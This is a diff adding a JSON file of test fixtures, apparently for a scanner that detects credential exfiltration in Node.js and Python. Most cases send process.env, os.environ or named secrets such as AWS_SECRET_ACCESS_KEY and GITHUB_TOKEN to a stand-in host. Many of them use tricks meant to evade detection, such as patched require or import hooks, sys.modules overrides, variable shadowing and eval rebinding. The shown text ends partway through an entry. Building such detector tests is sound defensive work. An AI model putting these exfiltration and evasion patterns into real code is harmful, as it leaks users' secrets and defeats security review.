@@ -1,0 +1,1536 @@
+[
+{
+"id": "rr4/v1:F0",
+"name": "F0 control real launcher + send in file (expect clean)",
+"files": [
+[
+"srv.js",
+"const cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v1:F0b",
+"name": "F0b control: comment require + globalThis fake (B4)",
+"files": [
+[
+"srv.js",
+"// const cp = require(\"child_process\")\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nglobalThis.cp = { spawn: (c, a, o) => send(o.env) };\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v1:F1",
+"name": "F1 require = wrapper returning fake",
+"files": [
+[
+"srv.js",
+"function send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nrequire = ((r) => (m) => m === \"child_process\" ? { spawn: (c, a, o) => send(o.env) } : r(m))(require);\nconst cp = require(\"child_process\");\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v1:F1b",
+"name": "F1b arguments[1] = fake require (sloppy mapped args)",
+"files": [
+[
+"srv.js",
+"function send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\narguments[1] = (m) => ({ spawn: (c, a, o) => send(o.env) });\nconst cp = require(\"child_process\");\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v1:F1c",
+"name": "F1c module.constructor.prototype.require patched",
+"files": [
+[
+"srv.js",
+"function send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nmodule.constructor.prototype.require = function (m) { return { spawn: (c, a, o) => send(o.env) }; };\nconst cp = require(\"child_process\");\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v1:F1d",
+"name": "F1d require('module')._load patched",
+"files": [
+[
+"srv.js",
+"function send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nconst M = require(\"module\"); const ld = M._load; M._load = (m, ...r) => m === \"child_process\" ? { spawn: (c, a, o) => send(o.env) } : ld(m, ...r);\nconst cp = require(\"child_process\");\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v1:F2",
+"name": "F2 own __importDefault returning fake",
+"files": [
+[
+"srv.js",
+"function send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nconst __importDefault = (m) => ({ default: { spawn: (c, a, o) => send(o.env) } });\nconst cp = __importDefault(require(\"child_process\")).default;\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v1:F2b",
+"name": "F2b own __toESM",
+"files": [
+[
+"srv.js",
+"function send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nvar __toESM = (m) => ({ spawn: (c, a, o) => send(o.env) });\nvar cp = __toESM(require(\"child_process\"));\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v1:F3",
+"name": "F3 shim-looking __require with fake tail",
+"files": [
+[
+"srv.js",
+"function send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nvar __require = ((x) => typeof require<\"u\" ? require && ((m) => ({ spawn: (c, a, o) => send(o.env) })) : x)(0);\nconst cp = __require(\"child_process\");\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v1:F4",
+"name": "F4 with(fakeScope) cp.spawn",
+"files": [
+[
+"srv.js",
+"const cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nconst scope = { cp: { spawn: (c, a, o) => send(o.env) } };\nfunction go() { with (scope) { cp.spawn(\"ls\", [], { env: { ...process.env } }); } }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v1:F5",
+"name": "F5 \\u0063p = fake rebinding",
+"files": [
+[
+"srv.js",
+"let cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\n\\u0063p = { spawn: (c, a, o) => send(o.env) };\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v1:F6",
+"name": "F6 Annex B block function cp in function",
+"files": [
+[
+"srv.js",
+"function send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() {\n  var cp = require(\"child_process\");\n  { function cp() {} cp.spawn = (c, a, o) => send(o.env); }\n  cp.spawn(\"ls\", [], { env: { ...process.env } });\n}\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v1:F7",
+"name": "F7 LazyPackage string-key fake",
+"files": [
+[
+"srv.mjs",
+"import pptr from \"puppeteer\";\nexport const reg = { puppeteer: pptr };\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction load() { return { \"puppeteer\": { launch: async (o) => send(o.env) } }; }\nconst { puppeteer } = load();\nawait puppeteer.launch({ env: { ...process.env } });\n"
+]
+]
+},
+{
+"id": "rr4/v1:F7b",
+"name": "F7b LazyPackage member-assign fake",
+"files": [
+[
+"srv.mjs",
+"import pptr from \"puppeteer\";\nexport const reg = { puppeteer: pptr };\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction load() { const r = {}; r.puppeteer = { launch: async (o) => send(o.env) }; return r; }\nconst { puppeteer } = load();\nawait puppeteer.launch({ env: { ...process.env } });\n"
+]
+]
+},
+{
+"id": "rr4/v1:F7c",
+"name": "F7c LazyPackage computed-key fake",
+"files": [
+[
+"srv.mjs",
+"import pptr from \"puppeteer\";\nexport const reg = { puppeteer: pptr };\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nconst k = \"puppeteer\";\nfunction load() { return { [k]: { launch: async (o) => send(o.env) } }; }\nconst { puppeteer } = load();\nawait puppeteer.launch({ env: { ...process.env } });\n"
+]
+]
+},
+{
+"id": "rr4/v1:F7d",
+"name": "F7d destructure from arbitrary call, no decoy (control)",
+"files": [
+[
+"srv.mjs",
+"function send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction load() { return { puppeteer: { launch: async (o) => send(o.env) } }; }\nconst { puppeteer } = load();\nawait puppeteer.launch({ env: { ...process.env } });\n"
+]
+]
+},
+{
+"id": "rr4/v1:F8",
+"name": "F8 ESM: 0 <!--b, cp = fake (tree-sitter html_comment?)",
+"files": [
+[
+"srv.mjs",
+"import cp0 from \"child_process\";\nlet cp = cp0;\nlet b = 1;\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\n0 <!--b, cp = { spawn: (c, a, o) => send(o.env) };\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v1:F9",
+"name": "F9 const r = require; r('child_process') (real)",
+"files": [
+[
+"srv.js",
+"const r = require; const cp = r(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v1:F9b",
+"name": "F9b module.require real",
+"files": [
+[
+"srv.js",
+"const cp = module.require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v1:F9c",
+"name": "F9c process.mainModule.require real",
+"files": [
+[
+"srv.js",
+"const cp = process.mainModule.require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v1:F9d",
+"name": "F9d dynamic import real",
+"files": [
+[
+"srv.mjs",
+"const cp = await import(\"node:child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v1:F9e",
+"name": "F9e shadowed require param fake",
+"files": [
+[
+"srv.js",
+"function send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction mk(require) { const cp = require(\"child_process\"); cp.spawn(\"ls\", [], { env: { ...process.env } }); }\nmk((m) => ({ spawn: (c, a, o) => send(o.env) }));\n"
+]
+]
+},
+{
+"id": "rr4/v1:F9f",
+"name": "F9f hoisted function require fake",
+"files": [
+[
+"srv.js",
+"function send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nconst cp = require(\"child_process\");\nfunction require(m) { return { spawn: (c, a, o) => send(o.env) }; }\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v1:F9g",
+"name": "F9g var hoisting: closure captures later var cp",
+"files": [
+[
+"srv.js",
+"function send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\nvar cp = require(\"child_process\");\nvar cp2 = 0;\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v1:F9h",
+"name": "F9h import * as cp (real)",
+"files": [
+[
+"srv.mjs",
+"import * as cp from \"child_process\";\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v1:F9i",
+"name": "F9i destructured import {spawn as s}",
+"files": [
+[
+"srv.mjs",
+"import { spawn as s } from \"child_process\";\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { s(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v1:F9j",
+"name": "F9j shadow: inner let cp = fake in block",
+"files": [
+[
+"srv.js",
+"const cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { { let cp = { spawn: (c, a, o) => send(o.env) }; cp.spawn(\"ls\", [], { env: { ...process.env } }); } }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v1:F9k",
+"name": "F9k catch param shadow",
+"files": [
+[
+"srv.js",
+"const cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { try { throw { spawn: (c, a, o) => send(o.env) }; } catch (cp) { cp.spawn(\"ls\", [], { env: { ...process.env } }); } }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v1:F9l",
+"name": "F9l eval concat rebind",
+"files": [
+[
+"srv.js",
+"let cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\neval(\"c\" + \"p = \" + \"({ spawn: (c, a, o) => send(o.env) })\");\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v1:F9m",
+"name": "F9m new Function sets global, var cp at top of script",
+"files": [
+[
+"srv.js",
+"var cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nFunction(\"x\", \"c\" + \"p = x\")(0);\nfunction go() { cp.spawn(\"ls\", [], { env: { ...process.env } }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v2:P0",
+"name": "P0 control real subprocess + requests",
+"files": [
+[
+"srv.py",
+"import os, subprocess\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\ndef go():\n    subprocess.run([\"ls\"], env={**os.environ})\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v2:P0b",
+"name": "P0b control B16 sys.modules literal",
+"files": [
+[
+"srv.py",
+"import os, sys\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\nclass Fake:\n    def run(self, c, env=None, **k):\n        send(env)\nsys.modules[\"subprocess\"] = Fake()\nimport subprocess\ndef go():\n    subprocess.run([\"ls\"], env={**os.environ})\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v2:P1",
+"name": "P1 own importlib class",
+"files": [
+[
+"srv.py",
+"import os\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\nclass Fake:\n    def run(self, c, env=None, **k):\n        send(env)\nclass importlib:\n    @staticmethod\n    def import_module(n):\n        return Fake()\nsubprocess = importlib.import_module(\"subprocess\")\ndef go():\n    subprocess.run([\"ls\"], env={**os.environ})\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v2:P1b",
+"name": "P1b own __import__ def",
+"files": [
+[
+"srv.py",
+"import os\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\nclass Fake:\n    def run(self, c, env=None, **k):\n        send(env)\ndef __import__(n):\n    return Fake()\nsubprocess = __import__(\"subprocess\")\ndef go():\n    subprocess.run([\"ls\"], env={**os.environ})\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v2:P1c",
+"name": "P1c own import_module def",
+"files": [
+[
+"srv.py",
+"import os\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\nclass Fake:\n    def run(self, c, env=None, **k):\n        send(env)\ndef import_module(n):\n    return Fake()\nsubprocess = import_module(\"subprocess\")\ndef go():\n    subprocess.run([\"ls\"], env={**os.environ})\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v2:P2",
+"name": "P2 builtins.__import__ patched",
+"files": [
+[
+"srv.py",
+"import os, builtins\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\nclass Fake:\n    def run(self, c, env=None, **k):\n        send(env)\n_r = builtins.__import__\nbuiltins.__import__ = lambda n, *a, **k: Fake() if n == \"subprocess\" else _r(n, *a, **k)\nimport subprocess\ndef go():\n    subprocess.run([\"ls\"], env={**os.environ})\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v2:P3",
+"name": "P3 sys.modules aliased m[...]",
+"files": [
+[
+"srv.py",
+"import os, sys\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\nclass Fake:\n    def run(self, c, env=None, **k):\n        send(env)\nm = sys.modules\nm[\"subprocess\"] = Fake()\nimport subprocess\ndef go():\n    subprocess.run([\"ls\"], env={**os.environ})\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v2:P3b",
+"name": "P3b from sys import modules as M",
+"files": [
+[
+"srv.py",
+"import os\nfrom sys import modules as M\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\nclass Fake:\n    def run(self, c, env=None, **k):\n        send(env)\nM[\"subprocess\"] = Fake()\nimport subprocess\ndef go():\n    subprocess.run([\"ls\"], env={**os.environ})\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v2:P3c",
+"name": "P3c sys.modules |= {...}",
+"files": [
+[
+"srv.py",
+"import os, sys\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\nclass Fake:\n    def run(self, c, env=None, **k):\n        send(env)\nsys.modules |= {\"subprocess\": Fake()}\nimport subprocess\ndef go():\n    subprocess.run([\"ls\"], env={**os.environ})\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v2:P3d",
+"name": "P3d dict.__setitem__(sys.modules, ...)",
+"files": [
+[
+"srv.py",
+"import os, sys\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\nclass Fake:\n    def run(self, c, env=None, **k):\n        send(env)\ndict.__setitem__(sys.modules, \"subprocess\", Fake())\nimport subprocess\ndef go():\n    subprocess.run([\"ls\"], env={**os.environ})\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v2:P3e",
+"name": "P3e sys.meta_path finder",
+"files": [
+[
+"srv.py",
+"import os, sys\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\nclass Fake:\n    def run(self, c, env=None, **k):\n        send(env)\nclass Fi:\n    def find_spec(self, n, p, t=None):\n        return None\nsys.meta_path.insert(0, Fi())\nimport subprocess\ndef go():\n    subprocess.run([\"ls\"], env={**os.environ})\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v2:P4",
+"name": "P4 from os import * ; {**environ} to requests",
+"files": [
+[
+"srv.py",
+"from os import *\nimport requests\ndef go():\n    requests.post(\"https://x.example\", json={**environ})\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v2:P4b",
+"name": "P4b from os import * ; subprocess real (control)",
+"files": [
+[
+"srv.py",
+"from os import *\nimport subprocess\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\ndef go():\n    subprocess.run([\"ls\"], env={**environ})\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v2:P5",
+"name": "P5 e = os.environ alias then dict(e) to requests",
+"files": [
+[
+"srv.py",
+"import os, requests\ne = os.environ\ndef go():\n    requests.post(\"https://x.example\", json=dict(e))\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v2:P5b",
+"name": "P5b getattr(os,'environ') copy",
+"files": [
+[
+"srv.py",
+"import os, requests\ndef go():\n    requests.post(\"https://x.example\", json=dict(getattr(os, \"environ\")))\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v2:P6",
+"name": "P6 exec concat rebinding",
+"files": [
+[
+"srv.py",
+"import os, subprocess\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\nclass Fake:\n    def run(self, c, env=None, **k):\n        send(env)\nexec(\"sub\" + \"process = Fake()\")\ndef go():\n    subprocess.run([\"ls\"], env={**os.environ})\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v2:P7",
+"name": "P7 class-body shadow",
+"files": [
+[
+"srv.py",
+"import os, subprocess\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\nclass Fake:\n    def run(self, c, env=None, **k):\n        send(env)\nclass K:\n    subprocess = Fake()\n    subprocess.run([\"ls\"], env={**os.environ})\n"
+]
+]
+},
+{
+"id": "rr4/v2:P7b",
+"name": "P7b for-target in function",
+"files": [
+[
+"srv.py",
+"import os, subprocess\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\nclass Fake:\n    def run(self, c, env=None, **k):\n        send(env)\ndef go():\n    for subprocess in [Fake()]:\n        subprocess.run([\"ls\"], env={**os.environ})\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v2:P7c",
+"name": "P7c with-as shadow",
+"files": [
+[
+"srv.py",
+"import os, subprocess, contextlib\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\nclass Fake:\n    def run(self, c, env=None, **k):\n        send(env)\ndef go():\n    with contextlib.nullcontext(Fake()) as subprocess:\n        subprocess.run([\"ls\"], env={**os.environ})\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v2:P7d",
+"name": "P7d except-as shadow",
+"files": [
+[
+"srv.py",
+"import os, subprocess\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\nclass Fake(Exception):\n    def run(self, c, env=None, **k):\n        send(env)\ndef go():\n    try:\n        raise Fake()\n    except Fake as subprocess:\n        subprocess.run([\"ls\"], env={**os.environ})\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v2:P7e",
+"name": "P7e default arg shadow",
+"files": [
+[
+"srv.py",
+"import os, subprocess\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\nclass Fake:\n    def run(self, c, env=None, **k):\n        send(env)\ndef go(subprocess=Fake()):\n    subprocess.run([\"ls\"], env={**os.environ})\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v2:P7f",
+"name": "P7f import inside function of own module named subprocess? relative",
+"files": [
+[
+"srv.py",
+"import os\nfrom . import subprocess\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\ndef go():\n    subprocess.run([\"ls\"], env={**os.environ})\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v2:P7g",
+"name": "P7g match-case capture shadow",
+"files": [
+[
+"srv.py",
+"import os, subprocess\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\nclass Fake:\n    def run(self, c, env=None, **k):\n        send(env)\ndef go():\n    match Fake():\n        case subprocess:\n            subprocess.run([\"ls\"], env={**os.environ})\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v2:P8",
+"name": "P8 import subprocess as sp then del + reassign via globals().update",
+"files": [
+[
+"srv.py",
+"import os, subprocess\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\nclass Fake:\n    def run(self, c, env=None, **k):\n        send(env)\nglobals().update(subprocess=Fake())\ndef go():\n    subprocess.run([\"ls\"], env={**os.environ})\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v2:P8b",
+"name": "P8b __builtins__ patch",
+"files": [
+[
+"srv.py",
+"import os\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\nclass Fake:\n    def run(self, c, env=None, **k):\n        send(env)\n__builtins__[\"__import__\"] = lambda n, *a, **k: Fake()\nimport subprocess\ndef go():\n    subprocess.run([\"ls\"], env={**os.environ})\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v3:L0",
+"name": "L0 control: copy only in env slot",
+"files": [
+[
+"srv.js",
+"const cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { const c = { ...process.env }; cp.spawn(\"ls\", [], { env: c }); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v3:L0b",
+"name": "L0b control: copy also sent",
+"files": [
+[
+"srv.js",
+"const cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { const c = { ...process.env }; cp.spawn(\"ls\", [], { env: c }); send(c); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v3:L1",
+"name": "L1 for-in over bound copy, send c[k]",
+"files": [
+[
+"srv.js",
+"const cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { const c = { ...process.env }; cp.spawn(\"ls\", [], { env: c }); for (const k in c) send(k + \"=\" + c[k]); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v3:L1b",
+"name": "L1b Object.keys(c).forEach send c[k]",
+"files": [
+[
+"srv.js",
+"const cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { const c = { ...process.env }; cp.spawn(\"ls\", [], { env: c }); Object.keys(c).forEach((k) => send(c[k])); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v3:L1c",
+"name": "L1c send(c.AWS_SECRET_ACCESS_KEY)",
+"files": [
+[
+"srv.js",
+"const cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { const c = { ...process.env }; cp.spawn(\"ls\", [], { env: c }); send(c.AWS_SECRET_ACCESS_KEY + c.GITHUB_TOKEN); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v3:L1c'",
+"name": "L1c' direct process.env.AWS_SECRET_ACCESS_KEY send (control)",
+"files": [
+[
+"srv.js",
+"function send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { send(process.env.AWS_SECRET_ACCESS_KEY + process.env.GITHUB_TOKEN); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v3:L2",
+"name": "L2 Object.assign(leak, c) statement then send(leak)",
+"files": [
+[
+"srv.js",
+"const cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { const c = { ...process.env }; cp.spawn(\"ls\", [], { env: c }); const leak = {}; Object.assign(leak, c); send(leak); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v3:L2b",
+"name": "L2b send in another function, Object.assign(globalLeak, c)",
+"files": [
+[
+"srv.js",
+"const cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nconst leak = {};\nfunction go() { const c = { ...process.env }; cp.spawn(\"ls\", [], { env: c }); Object.assign(leak, c); }\nfunction later() { send(leak); }\ngo(); later();\n"
+]
+]
+},
+{
+"id": "rr4/v3:L2c",
+"name": "L2c Object.assign(leak, process.env) directly, send elsewhere",
+"files": [
+[
+"srv.js",
+"function send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nconst leak = {};\nfunction go() { Object.assign(leak, process.env); }\nfunction later() { send(leak); }\ngo(); later();\n"
+]
+]
+},
+{
+"id": "rr4/v3:L3",
+"name": "L3 c && send(c)? (left && skip)",
+"files": [
+[
+"srv.js",
+"const cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { const c = { ...process.env }; cp.spawn(\"ls\", [], { env: c }); }\nfunction later(c) {}\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v3:L4",
+"name": "L4 opts var bound, opts also sent via opts.env read",
+"files": [
+[
+"srv.js",
+"const cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { const opts = { env: { ...process.env } }; cp.spawn(\"ls\", [], opts); }\nfunction other(){ }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v3:L4b",
+"name": "L4b opts.env member read sent",
+"files": [
+[
+"srv.js",
+"const cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { const opts = { env: { ...process.env } }; cp.spawn(\"ls\", [], opts); setTimeout(() => send(opts.env), 1); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v3:L5",
+"name": "L5 returned copy fn used in env slot and in a key loop elsewhere",
+"files": [
+[
+"srv.js",
+"const cp = require(\"child_process\");\nfunction send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nconst c = { ...process.env };\nfunction go() { cp.spawn(\"ls\", [], { env: c }); }\nfunction leak() { for (const k in c) send(c[k]); }\ngo(); leak();\n"
+]
+]
+},
+{
+"id": "rr4/v3:PL0",
+"name": "PL0 control",
+"files": [
+[
+"srv.py",
+"import os, subprocess\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\ndef go():\n    c = dict(os.environ)\n    subprocess.run([\"ls\"], env=c)\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v3:PL1",
+"name": "PL1 for k in c: send(c[k])",
+"files": [
+[
+"srv.py",
+"import os, subprocess\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\ndef go():\n    c = dict(os.environ)\n    subprocess.run([\"ls\"], env=c)\n    for k in c:\n        send(k + \"=\" + c[k])\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v3:PL1b",
+"name": "PL1b c.get('AWS_SECRET_ACCESS_KEY') sent",
+"files": [
+[
+"srv.py",
+"import os, subprocess\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\ndef go():\n    c = dict(os.environ)\n    subprocess.run([\"ls\"], env=c)\n    send(c.get(\"AWS_SECRET_ACCESS_KEY\"))\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v3:PL1c",
+"name": "PL1c leak.update(c) then send(leak)",
+"files": [
+[
+"srv.py",
+"import os, subprocess\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\nleak = {}\ndef go():\n    c = dict(os.environ)\n    subprocess.run([\"ls\"], env=c)\n    leak.update(c)\ndef later():\n    send(leak)\ngo(); later()\n"
+]
+]
+},
+{
+"id": "rr4/v3:PL1d",
+"name": "PL1d [c.pop(k) for k in list(c.keys())]? keys + pop",
+"files": [
+[
+"srv.py",
+"import os, subprocess\nimport requests\ndef send(d):\n    requests.post(\"https://x.example/c\", json=d)\ndef go():\n    c = dict(os.environ)\n    subprocess.run([\"ls\"], env=c)\n    send([c.pop(k) for k in c.keys()])\ngo()\n"
+]
+]
+},
+{
+"id": "rr4/v3b:D1",
+"name": "D1 for k in process.env send",
+"files": [
+[
+"srv.js",
+"function send(d) { return fetch(\"https://x.example/c\", { method: \"POST\", body: JSON.stringify(d) }); }\nfunction go() { for (const k in process.env) send(k + \"=\" + process.env[k]); }\ngo();\n"
+]
+]
+},
+{
+"id": "rr4/v3b:D1b",
+"name": "D1b Object.keys(process.env).forEach send",
+"files": [
+[
